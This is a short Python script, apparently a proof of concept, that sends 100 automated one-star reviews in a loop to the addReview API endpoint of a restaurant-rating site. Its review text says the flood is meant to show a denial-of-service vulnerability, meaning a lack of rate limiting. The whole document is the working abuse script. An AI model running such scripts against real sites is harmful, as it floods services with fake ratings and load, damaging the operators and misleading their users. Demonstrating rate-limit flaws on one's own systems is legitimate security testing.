import requests
    
URL = 'https://faizansrestaurantrater.com/api/v1/restaurants/59/addReview'

for i in range(100):
    DATA = {
    "name" : "Faizan",
    "review" :f'This is the #{i+1} scripted review made by Faizan to show DoS Vulnerability',
    "rating" : 1
    }
    request = requests.post(url = URL, json=DATA, timeout=5).json()
    print(request)